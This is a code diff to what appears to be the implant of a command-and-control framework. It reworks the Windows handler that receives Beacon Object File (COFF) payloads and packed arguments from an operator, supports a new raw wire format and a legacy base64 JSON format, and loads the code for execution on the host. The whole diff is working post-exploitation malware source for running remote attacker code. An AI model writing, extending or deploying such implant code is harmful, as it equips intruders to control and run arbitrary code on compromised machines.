@@ -5167,27 +5167,44 @@ void dispatch_task(AgentTask *task) {
     }
 #ifdef _WIN32
     else if (strcmp(type_upper, "BOF") == 0) {
-        /* args JSON: {"coff_b64":"<base64 COFF>","args_b64":"<base64 packed args>"} */
+        /*
+         * Current wire format: task->payload contains raw COFF bytes and
+         * task->args contains base64-packed BeaconDataParse arguments.
+         *
+         * Keep accepting the older inline format in task->args:
+         * {"coff_b64":"<base64 COFF>","args_b64":"<base64 packed args>"}
+         * and the in-process store name, so agents built before the wire
+         * format was unified remain interoperable with older clients.
+         */
+        const char *task_args = task->args ? task->args : "";
         const char *coff_start = NULL;
         const char *args_start = NULL;
         size_t coff_b64_len = 0, args_b64_len = 0;
-
-        /* Extract coff_b64 value */
-        const char *p = strstr(args, "\"coff_b64\"");
-        if (p) {
-            p = strchr(p + 10, '"');
-            if (p) {
-                p++;
-                const char *end = p;
-                while (*end && *end != '"') end++;
-                coff_start   = p;
-                coff_b64_len = (size_t)(end - p);
-            }
-        }
         size_t coff_len = 0;
         uint8_t *coff_data = NULL;
 
-        if (coff_start && coff_b64_len > 0) {
+        if (task->payload && task->payload_len > 0) {
+            /* Unified wire format: copy the raw payload before task cleanup. */
+            coff_len = task->payload_len;
+            coff_data = (uint8_t *)malloc(coff_len);
+            if (!coff_data) { agent_send_result(task->id, "", "BOF: oom"); return; }
+            memcpy(coff_data, task->payload, coff_len);
+        } else {
+            /* Extract coff_b64 from the legacy inline JSON format. */
+            const char *p = strstr(task_args, "\"coff_b64\"");
+            if (p) {
+                p = strchr(p + 10, '"');
+                if (p) {
+                    p++;
+                    const char *end = p;
+                    while (*end && *end != '"') end++;
+                    coff_start   = p;
+                    coff_b64_len = (size_t)(end - p);
+                }
+            }
+        }
+
+        if (!coff_data && coff_start && coff_b64_len > 0) {
             char *coff_b64 = (char *)malloc(coff_b64_len + 1);
             if (!coff_b64) { agent_send_result(task->id, "", "BOF: oom"); return; }
             memcpy(coff_b64, coff_start, coff_b64_len);
@@ -5198,10 +5215,10 @@ void dispatch_task(AgentTask *task) {
                 free(coff_data);
                 agent_send_result(task->id, "", "BOF: coff_b64 decode failed"); return;
             }
-        } else {
+        } else if (!coff_data) {
             /* no inline payload — check in-process store; first token of args is the name */
             char bof_name[128] = "";
-            sscanf(args, "%127s", bof_name);
+            sscanf(task_args, "%127s", bof_name);
             uint8_t *stored = bof_name[0] ? bof_store_get(bof_name, &coff_len) : NULL;
             if (!stored || coff_len == 0) {
                 agent_send_result(task->id, "", "BOF: missing coff_b64 and not in store"); return;
@@ -5214,22 +5231,34 @@ void dispatch_task(AgentTask *task) {
         /* Extract optional args_b64 value */
         uint8_t *bof_args  = NULL;
         size_t   bof_alen  = 0;
-        p = strstr(args, "\"args_b64\"");
-        if (p) {
-            p = strchr(p + 10, '"');
+        if (task->payload && task->payload_len > 0) {
+            /* Unified wire format: task args are already base64-packed. */
+            if (task_args[0]) {
+                bof_args = b64_decode(task_args, &bof_alen);
+                if (!bof_args || bof_alen == 0) {
+                    free(coff_data);
+                    free(bof_args);
+                    agent_send_result(task->id, "", "BOF: args decode failed"); return;
+                }
+            }
+        } else {
+            const char *p = strstr(task_args, "\"args_b64\"");
             if (p) {
-                p++;
-                const char *end = p;
-                while (*end && *end != '"') end++;
-                args_start   = p;
-                args_b64_len = (size_t)(end - p);
-                if (args_b64_len > 0) {
-                    char *ab64 = (char *)malloc(args_b64_len + 1);
-                    if (ab64) {
-                        memcpy(ab64, args_start, args_b64_len);
-                        ab64[args_b64_len] = '\0';
-                        bof_args = b64_decode(ab64, &bof_alen);
-                        free(ab64);
+                p = strchr(p + 10, '"');
+                if (p) {
+                    p++;
+                    const char *end = p;
+                    while (*end && *end != '"') end++;
+                    args_start   = p;
+                    args_b64_len = (size_t)(end - p);
+                    if (args_b64_len > 0) {
+                        char *ab64 = (char *)malloc(args_b64_len + 1);
+                        if (ab64) {
+                            memcpy(ab64, args_start, args_b64_len);
+                            ab64[args_b64_len] = '\0';
+                            bof_args = b64_decode(ab64, &bof_alen);
+                            free(ab64);
+                        }
                     }
                 }
             }
